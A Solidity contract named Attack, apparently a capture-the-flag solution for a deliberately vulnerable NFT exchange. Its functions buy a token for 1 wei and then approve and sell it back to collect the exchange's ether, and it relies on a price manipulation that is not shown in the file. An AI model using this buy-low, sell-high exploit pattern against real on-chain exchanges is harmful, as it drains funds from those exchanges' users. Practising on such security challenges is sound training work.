// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {IERC721Receiver} from "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IExchange {

    function buyOne() external payable returns (uint256 id);
    function sellOne(uint256 id) external ;

}

interface IDamnValuableNFT {

    function approve(address to, uint256 tokenId) external ;
}

contract Attack is IERC721Receiver {

    IExchange public exchange;
    IDamnValuableNFT public nftContract;
    uint256 public nftId;


    constructor(address _exchange, address _nftContract) {

        exchange = IExchange(_exchange);
        nftContract = IDamnValuableNFT(_nftContract);
    }

    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data) external returns (bytes4) {
        
        return IERC721Receiver.onERC721Received.selector;
    }    


    function attackBuy() public {

        nftId = exchange.buyOne{value : 1}();
    }

    function attackSell() public {
        nftContract.approve(address(exchange), nftId);
        exchange.sellOne(nftId);
    }

    fallback() external payable {}

    receive() external payable {}

}